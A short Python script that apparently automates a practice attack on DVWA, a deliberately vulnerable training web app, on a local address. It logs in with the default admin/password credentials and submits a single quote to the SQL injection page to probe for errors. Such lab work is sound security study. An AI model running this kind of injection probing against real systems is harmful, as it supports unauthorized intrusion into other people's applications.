#!/usr/bin/env python
#_*_ coding: utf8 _*_

import mechanize
from bs4 import BeautifulSoup

nav = mechanize.Browser()
nav.set_handle_robots(False)
nav.set_handle_equiv(False)
nav.addheaders = [('User-Agent','Firefox')]
nav.open("http://192.168.0.21:42001/index.php")
nav.select_form(nr=0)

nav['username'] = 'admin'
nav['password'] = 'password'

nav.submit()

nav.open("http://192.168.0.21:42001/vulnerabilities/sqli/")
nav.select_form(nr=0)

nav['id'] = "'"

nav.submit()

#print(nav.response().read())

#for f in nav.forms():
   #print(f)

soup = BeautifulSoup(nav.response().read(),'html5lib')
print(soup())

